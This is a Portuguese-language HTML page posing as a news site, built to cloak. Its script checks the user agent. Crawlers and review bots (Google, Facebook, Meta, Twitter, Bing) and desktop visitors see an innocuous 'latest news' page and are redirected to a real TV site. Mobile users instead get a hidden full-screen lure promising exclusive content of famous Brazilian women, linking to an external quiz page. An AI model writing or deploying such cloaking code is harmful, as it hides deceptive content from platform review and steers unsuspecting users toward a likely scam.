<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Últimas Notícias</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: #0a0a1a;
            color: #fff;
            height: 100vh;
            overflow: hidden;
        }
        
        /* PÁGINA WHITE (para bots) */
        #white-page {
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
            text-align: center;
        }
        
        /* PÁGINA BLACK (para humanos - FULLSCREEN MOBILE) */
        #black-page {
            display: none;
            height: 100vh;
            width: 100vw;
            background: linear-gradient(135deg, #1e0028 0%, #2a0a3a 100%);
            padding: 20px;
            text-align: center;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        
        .content {
            max-width: 90%;
            margin: 0 auto;
        }
        
        h1 {
            color: #ff2d55;
            font-size: 28px;
            margin-bottom: 20px;
            text-shadow: 0 2px 5px rgba(0,0,0,0.5);
        }
        
        p {
            font-size: 18px;
            margin-bottom: 30px;
            line-height: 1.5;
            color: #eee;
        }
        
        .btn {
            background: #ff2d55;
            color: white;
            padding: 16px 32px;
            border-radius: 50px;
            text-decoration: none;
            font-size: 18px;
            font-weight: bold;
            display: inline-block;
            margin: 10px;
            box-shadow: 0 4px 15px rgba(255,45,85,0.4);
            transition: all 0.3s;
            border: none;
            width: 90%;
            max-width: 300px;
        }
        
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(255,45,85,0.6);
        }
        
        .btn-secondary {
            background: #444;
            color: #fff;
        }
        
        @media (min-width: 768px) {
            #black-page {
                padding: 40px;
            }
            h1 {
                font-size: 32px;
            }
            p {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <!-- PÁGINA WHITE (para bots) -->
    <div id="white-page">
        <h1>Últimas Notícias</h1>
        <p>Carregando as manchetes do dia...</p>
    </div>

    <!-- PÁGINA BLACK FULLSCREEN (para humanos) -->
    <div id="black-page">
        <div class="content">
            <h1>🔥 ACESSO VIP</h1>
            <p>Conteúdos exclusivos das famosas mais desejadas do Brasil</p>
            
            <a href="https://avelino-star.github.io/Quiz/" class="btn">
                ENTRAR AGORA
            </a>
            
            <button id="btn-voltar" class="btn btn-secondary">
                NÃO QUERO
            </button>
        </div>
    </div>

    <script>
        // Verificação avançada
        function isHuman() {
            const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            const isBot = /bot|facebook|google|meta|twitter|slurp|bing/i.test(navigator.userAgent);
            return isMobile && !isBot;
        }

        // Fluxo principal
        if (isHuman()) {
            // Humanos: Mostra black page fullscreen
            setTimeout(() => {
                document.getElementById('white-page').style.display = 'none';
                document.getElementById('black-page').style.display = 'flex';
            }, 1000);
        } else {
            // Bots/PCs: Redireciona após 3s
            setTimeout(() => {
                window.location.href = "https://www.atelevisao.com";
            }, 3000);
        }
        
        // Botão "NÃO QUERO" volta para white page
        document.getElementById('btn-voltar')?.addEventListener('click', () => {
            document.getElementById('black-page').style.display = 'none';
            document.getElementById('white-page').style.display = 'flex';
        });
    </script>
</body>
</html>
